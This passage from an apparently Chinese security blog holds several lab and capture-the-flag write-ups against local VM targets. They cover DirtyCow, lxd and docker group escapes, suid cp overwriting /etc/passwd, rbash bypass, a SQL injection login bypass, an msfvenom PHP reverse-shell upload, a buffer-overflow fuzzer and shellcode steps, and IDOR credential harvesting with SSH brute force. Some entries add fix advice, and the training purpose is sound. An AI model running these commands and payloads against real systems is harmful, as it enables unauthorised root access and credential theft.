/><p>切回靶机，执行exp命令，看id依旧是普通用户，但是此时我们已经具有root权限了，如果要深入利用，可以参考我上面用的passwd攻击手法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;exp</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545d1bbeae" alt="image-20201223104402814"></p><p>修复建议：合理配置nfs权限，禁止写入。</p><h2 id="历史记录密码泄露"><a href="#历史记录密码泄露" class="headerlink" title="历史记录密码泄露"></a>历史记录密码泄露</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545d67be4f" alt="image-20201223104548656"></p><p>可以看到密码泄露，su切换root用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><p>修复建议：清除历史记录，不直接再命令行中使用密码。</p><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>查看内核版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545db5d78b" alt="image-20201223104945982"></p><p>使用脏牛提权，使用exploit-db的exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux&#x2F;local&#x2F;40839.c -m</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545e03713b" alt="image-20201223111219838"></p><p>使用gcc编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545e4e7105" alt="image-20201223111328476"></p><p>回传到靶机上</p><p><img src="https://img.rruu.net/image/5fe545e985f32" alt="image-20201223111355938"></p><p>su切换firefart用户</p><p><img src="https://img.rruu.net/image/5fe545ef36cb6" alt="image-20201223111416558"></p><p>发现firefart用户是root组，至此提权完成。</p><p>修复建议：升级内核版本，使用最新版本的ubuntu。</p><h2 id="lxc提权"><a href="#lxc提权" class="headerlink" title="lxc提权"></a>lxc提权</h2><p>id查看用户基本信息，发现在lxd用户组，使用lxd提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe32828e081c" alt="image-20201218101628436"></p><p>github构建提权环境</p><p><a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;build-alpine</span><br></pre></td></tr></table></figure><p>然后回自动生成一个tar.gz文件，重命名成t.tar.gz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv alpine-v3.12-x86_64-20201217_1534.tar.gz t.tar.gz</span><br></pre></td></tr></table></figure><p>将t.tar.gz文件传输到目标主机上面，使用python开启http服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><p>目标主机使用wget下载t.tar.gz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.105&#x2F;t.tar.gz</span><br></pre></td></tr></table></figure><p>需要先初始化环境 一切默认</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxd init</span><br></pre></td></tr></table></figure><p>查看一下image</p><p><img src="https://img.rruu.net/image/5fe32828df765" alt="image-20201218102502019"></p><p>发现没有任何镜像，我们导入一下镜像，然后再次查看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc image import .&#x2F;t.tar.gz --alias dmagicsec</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe32828e4998" alt="image-20201218102541247"></p><p>初始化容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc init dmagicsec dmagicsec -c security.privileged&#x3D;true</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe32828df9f4" alt="image-20201218103022044"></p><p>映射容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc config device add dmagicsec dmagicsec disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe32828e15a6" alt="image-20201218103045116"></p><p>启动容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc start dmagicsec</span><br></pre></td></tr></table></figure><p>执行交互shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc exec dmagicsec &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe32828e3975" alt="image-20201218103123276"></p><p>获取flag</p><p><img src="https://img.rruu.net/image/5fe5460ce8282" alt="image-20201218103254958"></p><h2 id="docker权限提升"><a href="#docker权限提升" class="headerlink" title="docker权限提升"></a>docker权限提升</h2><p>查看id属于docker组，我们使用docker提权。</p><p><img src="https://img.rruu.net/image/5fe5461256c83" alt="image-20201221111957878"></p><p>提升权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -v &#x2F;:&#x2F;mnt bash</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54616dacf5" alt="image-20201221112029286"></p><p>思路：目前我们将目标靶机的整盘目录挂载到了docker中，且在/mnt目录下，我们修改/mnt目录下面的文件，会直接影响到靶机。所以我们修改/etc/passwd文件，添加root权限用户。</p><p>生成密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opensll passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5461b85e5e" alt="image-20201221121258488"></p><p>进入我们刚刚root权限的虚拟容器shell，添加用户。格式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;mnt&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe546206c6a7" alt="image-20201221121420566"></p><p>查看flag文件</p><p><img src="https://img.rruu.net/image/5fe54626beec6" alt="image-20201221121612040"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>school</title>
      <link href="2020/12/25/school/"/>
      <url>2020/12/25/school/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机：192.168.56.105</p><p>靶机：192.168.56.121</p><p>这篇文章写的不是特别好，如果缓冲区没有看懂的，可以私信我，我会为你解答。QQ：2933653699</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Nmap扫描"><a href="#Nmap扫描" class="headerlink" title="Nmap扫描"></a>Nmap扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oN school.nmap 192.168.56.121</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5429e0a998" alt="image-20201224201910918"></p><p>开放 22 23 80</p><p>22 ssh</p><p>23 未知 nmap猜测是telnet，自己测试使用telnet无法连接。</p><p>80 web</p><p>渗透思路：通过80端口getshell，反弹shell回来进行提权。</p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>firefox打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.121</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542a3c7de8" alt="image-20201224202505086"></p><p>gobuster扫描目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 100 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.56.121 -o dir.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542a950877" alt="image-20201224203002654"></p><p>没有啥结果，我们扫一下student_attendance</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 100 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.56.121&#x2F;student_attendance&#x2F; -o dir.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542aec8713" alt="image-20201224203153421"></p><p>查看database目录</p><p><img src="https://img.rruu.net/image/5fe542b43bba5" alt="image-20201224203218267"></p><p>将文件下载下来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.121&#x2F;student_attendance&#x2F;database&#x2F;student_attendance_db.sql</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542baf2edb" alt="image-20201224203255258"></p><p>发现一个用户名</p><p><img src="https://img.rruu.net/image/5fe542c01d1a5" alt="image-20201224203516697"></p><p>没有任何价值，尝试登录失败。看来数据库文件没有啥用，我们尝试对网站进行漏洞攻击。</p><h3 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h3><p>手工使用万能密码进行检测，存在注入漏洞，我们可以直接进入系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542c573099" alt="image-20201224203631417"></p><h2 id="网站后台getshell"><a href="#网站后台getshell" class="headerlink" title="网站后台getshell"></a>网站后台getshell</h2><p>简单查看，未发现上传点。右键源代码，发现上传点。</p><p><img src="https://img.rruu.net/image/5fe542ca33d36" alt="image-20201224204029049"></p><p>msf生成phpshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.56.105 LPORT&#x3D;9000 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p>上传到网站上</p><p><img src="https://img.rruu.net/image/5fe542cf4ecff" alt="image-20201224234057152"></p><p>直接上传，他会自己运行的。返回了shell</p><p><img src="https://img.rruu.net/image/5fe542d4752cf" alt="image-20201224234144634"></p><p>拿到第一个flag</p><p><img src="https://img.rruu.net/image/5fe542da2ac06" alt="image-20201224234229326"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>查找网站配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat db_connect.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542df6dd9e" alt="image-20201224234506919"></p><p>尝试ssh su切换用户均失败</p><p><img src="https://img.rruu.net/image/5fe542e4b00ab" alt="image-20201224234909519"></p><p>尝试suid提权失败</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542ea8c710" alt="image-20201224235154430"></p><p>目前来说，提权是不太可能提权的，我们继续做信息收集。前往root目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;root</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542f009c8c" alt="image-20201224235309605"></p><p>没有权限，但是我们发现了win文件，很奇怪，我们去看看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat win</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542f7223c9" alt="image-20201224235403168"></p><p>使用wine去运行exe文件，以root权限，我们下载下来到windows上分析一下该exe。</p><p><img src="https://img.rruu.net/image/5fe542fc442e0" alt="image-20201224235505559"></p><h3 id="审计exe文件"><a href="#审计exe文件" class="headerlink" title="审计exe文件"></a>审计exe文件</h3><p>这个文件是这样的，他会开启这个23端口，然后接受23端口输出。我们尝试缓冲区溢出。使用python编写fuzz缓冲区最大值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import socket,time</span><br><span class="line"></span><br><span class="line">num &#x3D; 5</span><br><span class="line">try:</span><br><span class="line">    while True:</span><br><span class="line">        buffer &#x3D; b&quot;A&quot; * num</span><br><span class="line">        s &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        s.connect((&quot;192.168.132.144&quot;,23))</span><br><span class="line">        s.send((buffer))</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.close()</span><br><span class="line">        time.sleep(0.05)</span><br><span class="line">        print(&quot;[*]Payload is %i As&quot; % (num))</span><br><span class="line">        num +&#x3D; 5</span><br><span class="line">except:</span><br><span class="line">    print(&quot;[*]Payload is %i As&quot; % (num-5))</span><br></pre></td></tr></table></figure><p>确定缓冲区准确值为1900。</p><p><img src="https://img.rruu.net/image/5fe543017bc8d" alt="image-20201225000620036"></p><h3 id="缓冲区溢出exp编写"><a href="#缓冲区溢出exp编写" class="headerlink" title="缓冲区溢出exp编写"></a>缓冲区溢出exp编写</h3><p>我们使用x32dbg调试程序，进一步利用。</p><p><img src="https://img.rruu.net/image/5fe5430668937" alt="image-20201225001045022"></p><p>直接运行，发现dbg的寄存器发生变化，全部是424242 就是 BBB。</p><p><img src="https://img.rruu.net/image/5fe5430ae9df4" alt="image-20201225001126986"></p><p>如果需要进一步利用，需要过滤坏的字符串，我们使用python生成字符fuzz列表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;for i in range(1,256): print(&#39;\\x%02x&#39; % i, end&#x3D;&#39;&#39;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54310654a3" alt="image-20201225001605820"></p><p>复制到测试文件中</p><p><img src="https://img.rruu.net/image/5fe54314b00e2" alt="image-20201225001710190"></p><p>发现b0为坏字符，即/x4c后面的字符为坏字符，我们去除掉，然后重复此步骤。</p><p><img src="https://img.rruu.net/image/5fe543196a514" alt="image-20201225001804892"></p><p>重复测试，发现4e后面的字符为坏字符，去掉，重新测试一遍。</p><p><img src="https://img.rruu.net/image/5fe5431dd0472" alt="image-20201225002000692"></p><p>发现5e后面的字符为坏字符我们去掉重复测试。</p><p><img src="https://img.rruu.net/image/5fe543239954b" alt="image-20201225002050017"></p><p>最后得出，坏字符为，\x00这个字符别用，本身就是坏字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00\x4d\x4f\x5f\x79\x7e\x7f</span><br></pre></td></tr></table></figure><p>接下来，我们来查找jmp esp （栈指针寄存器）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">625012DD</span><br></pre></td></tr></table></figure><p>最终利用exp如下：</p><p><img src="https://img.rruu.net/image/5fe5432842108" alt="image-20201225003739440"></p><p>我们使用msf生成shellcode代码，使用-b参数去除坏字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;messagebox TEXT&#x3D;&quot;hello magisec&quot; -f c -b &quot;\x00\x4d\x4f\x5f\x79\x7e\x7f&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5432cb4e81" alt="image-20201225004044656"></p><p>处理shellcode，如下：</p><p><img src="https://img.rruu.net/image/5fe543340b862" alt="image-20201225004939721"></p><p>使用python3运行</p><p><img src="https://img.rruu.net/image/5fe5433871d52" alt="image-20201225004954365">、</p><p>运行完成，出现弹窗，已经执行shellcode了。</p><p><img src="https://img.rruu.net/image/5fe5433cb0684" alt="image-20201225005032954"></p><h3 id="利用缓冲区溢出反弹root权限shell"><a href="#利用缓冲区溢出反弹root权限shell" class="headerlink" title="利用缓冲区溢出反弹root权限shell"></a>利用缓冲区溢出反弹root权限shell</h3><p>切回kali，配置监听。生成shellcode代码。</p><p><img src="https://img.rruu.net/image/5fe54341554a0" alt="image-20201225005935314"></p><p>我们在linux反弹一个shell回来，python代码如下：</p><p><img src="https://img.rruu.net/image/5fe543468813a" alt="image-20201225005848610"></p><p><img src="https://img.rruu.net/image/5fe5434b7ca25" alt="image-20201225010054043"></p><p>成功返回shell，读取flag文件。</p><p><img src="https://img.rruu.net/image/5fe543518507b" alt="image-20201225010211123"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux suid cp特权提升</title>
      <link href="2020/12/24/linux_suid_cp%E6%8F%90%E6%9D%83/"/>
      <url>2020/12/24/linux_suid_cp%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="Bypass-rbash限制"><a href="#Bypass-rbash限制" class="headerlink" title="Bypass rbash限制"></a>Bypass rbash限制</h2><h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh marcus@192.168.56.108 密码：3_d4y</span><br></pre></td></tr></table></figure><h3 id="查看shell"><a href="#查看shell" class="headerlink" title="查看shell"></a>查看shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo $SHELL</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe40427a1574" alt="image-20201218192950845"></p><p>发现是rbash，有命令限制，使用/bash/sh</p><h3 id="绕过rbash"><a href="#绕过rbash" class="headerlink" title="绕过rbash"></a>绕过rbash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh marcus@192.168.56.108 -t &quot;bash -noprofile&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe4042c9f771" alt="image-20201218193051677"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe40432c636e" alt="image-20201218193231100"></p><h3 id="搜索suid特权文件"><a href="#搜索suid特权文件" class="headerlink" title="搜索suid特权文件"></a>搜索suid特权文件</h3><p>发现cp命令有suid特权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe40437c3c5e" alt="image-20201218193341613"></p><h2 id="cp-提权"><a href="#cp-提权" class="headerlink" title="cp 提权"></a>cp 提权</h2><h3 id="生成password"><a href="#生成password" class="headerlink" title="生成password"></a>生成password</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -l -salt magisec 123456</span><br></pre></td></tr></table></figure><h3 id="修改passwd文件"><a href="#修改passwd文件" class="headerlink" title="修改passwd文件"></a>修改passwd文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd &gt; passwd.txt</span><br><span class="line">vi passwd.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe4043feb1a9" alt="image-20201218193726190"></p><h3 id="覆盖passwd文件"><a href="#覆盖passwd文件" class="headerlink" title="覆盖passwd文件"></a>覆盖passwd文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;tmp&#x2F;passwd.txt &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="切换用户完成提权"><a href="#切换用户完成提权" class="headerlink" title="切换用户完成提权"></a>切换用户完成提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su magisec 密码123456</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe4044595f6f" alt="image-20201218193937549"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>平行越权漏洞挖掘与phpsuid特权提升</title>
      <link href="2020/12/24/%E5%B9%B3%E8%A1%8C%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8Ephpsuid%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87/"/>
      <url>2020/12/24/%E5%B9%B3%E8%A1%8C%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8Ephpsuid%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<h2 id="80端口漏洞测试"><a href="#80端口漏洞测试" class="headerlink" title="80端口漏洞测试"></a>80端口漏洞测试</h2><h3 id="绕过XFF头ip验证"><a href="#绕过XFF头ip验证" class="headerlink" title="绕过XFF头ip验证"></a>绕过XFF头ip验证</h3><p>访问目标，发现验证来源ip。</p><p><img src="https://img.rruu.net/image/5fe3f04ae71f0" alt="image-20201219110309992"></p><p>修改xff头即可绕过，这里使用firefox的插件，<a href="https://github.com/MisterPhilip/x-forwarded-for%EF%BC%8C%E8%BF%99%E6%98%AFip%E4%B8%BA127.0.0.1">https://github.com/MisterPhilip/x-forwarded-for，这是ip为127.0.0.1</a></p><p><img src="https://img.rruu.net/image/5fe3f06d1f2af" alt="image-20201219110452887.png"></p><p>发现用户注册功能，这里注册一个magisec用户，密码同用户。</p><p><img src="https://img.rruu.net/image/5fe3f0fc48346" alt="image-20201219110532822.png"></p><p>登录成功</p><p><img src="https://img.rruu.net/image/5fe3f1114d139" alt="image-20201219110547540.png"></p><h3 id="SQLMap检测SQL注入"><a href="#SQLMap检测SQL注入" class="headerlink" title="SQLMap检测SQL注入"></a>SQLMap检测SQL注入</h3><p>发现仅profile文件存在利用价值，尝试对user_id参数进行注入测试。</p><p><img src="https://img.rruu.net/image/5fe3f2032d776" alt="image-20201219112144211"></p><p>sqlmap开始测试</p><p><img src="https://img.rruu.net/image/5fe3f2f3e5371" alt="image-20201219112209956"></p><p>直接跑死，手工测试不存在sql注入。</p><p><img src="https://img.rruu.net/image/5fe3f7f435011" alt="image-20201219112308053"></p><h3 id="平行越权挖掘与利用"><a href="#平行越权挖掘与利用" class="headerlink" title="平行越权挖掘与利用"></a>平行越权挖掘与利用</h3><p>修改user_id为1发现，存在水平越权，泄露用户名密码。</p><p><img src="https://img.rruu.net/image/5fe3fc07995d7" alt="image-20201219112417044"></p><p>两种利用方法，第一 使用burpsuite直接便利抓取用户信息 第二，自己编写爬虫脚本爬取信息。</p><h4 id="burpsuite抓取用户名信息"><a href="#burpsuite抓取用户名信息" class="headerlink" title="burpsuite抓取用户名信息"></a>burpsuite抓取用户名信息</h4><p>这里先演示burp suite</p><p>添加上用户名密码</p><p><img src="https://img.rruu.net/image/5fe3fc0ecff15" alt="image-20201219135115195"></p><p>payload设置纯数字</p><p><img src="https://img.rruu.net/image/5fe3fc1645899" alt="image-20201219135154421"></p><p><img src="https://img.rruu.net/image/5fe3fc72ab087" alt="image-20201219135140532"></p><p>点击start，查看结果。</p><p><img src="https://img.rruu.net/image/5fe3fc7c63d25" alt="image-20201219135225973"></p><p>将结果保存为user.txt与pass.txt即可</p><h4 id="Python-Bs4编写抓取脚本"><a href="#Python-Bs4编写抓取脚本" class="headerlink" title="Python Bs4编写抓取脚本"></a>Python Bs4编写抓取脚本</h4><p>第二，使用python编写脚本</p><p>代码如下：</p><p><img src="https://img.rruu.net/image/5fe3fc825e153" alt="image-20201219135710259"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getinfo.py</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe3fc8a4f3fa" alt="image-20201219135647621"></p><p>收集用户名密码加工处理，爆破ssh，得到密码。</p><p><img src="https://img.rruu.net/image/5fe3fc902f751" alt="image-20201219140044096"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>收集基本信息</p><p><img src="https://img.rruu.net/image/5fe3fc96bd237" alt="image-20201219140507847"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>发现php具有sudo权限，我们直接使用php来进行提权</p><h3 id="具有suid权限的php特权提升"><a href="#具有suid权限的php特权提升" class="headerlink" title="具有suid权限的php特权提升"></a>具有suid权限的php特权提升</h3><p><img src="https://img.rruu.net/image/5fe3fc9f222a0" alt="image-20201219140613095"></p><p>获取flag</p><p><img src="https://img.rruu.net/image/5fe3fca60826e" alt="image-20201219140653525"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux 虚拟容器 lxc提权</title>
      <link href="2020/12/23/Linux_lxc%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87/"/>
      <url>2020/12/23/Linux_lxc%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<p>id查看用户基本信息，发现在lxd用户组，使用lxd提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/U7bf0b26d6bd44358807976317912ca02c.jpg" alt="image-20201218101628436"></p><p>github构建提权环境</p><p><a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;build-alpine</span><br></pre></td></tr></table></figure><p>然后回自动生成一个tar.gz文件，重命名成t.tar.gz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv alpine-v3.12-x86_64-20201217_1534.tar.gz t.tar.gz</span><br></pre></td></tr></table></figure><p>将t.tar.gz文件传输到目标主机上面，使用python开启http服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><p>目标主机使用wget下载t.tar.gz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.105&#x2F;t.tar.gz</span><br></pre></td></tr></table></figure><p>需要先初始化环境 一切默认</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxd init</span><br></pre></td></tr></table></figure><p>查看一下image</p><p><img src="https://ae01.alicdn.com/kf/U90208be63fe242d39b5c49412ef95821g.jpg" alt="image-20201218102502019"></p><p>发现没有任何镜像，我们导入一下镜像，然后再次查看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc image import .&#x2F;t.tar.gz --alias 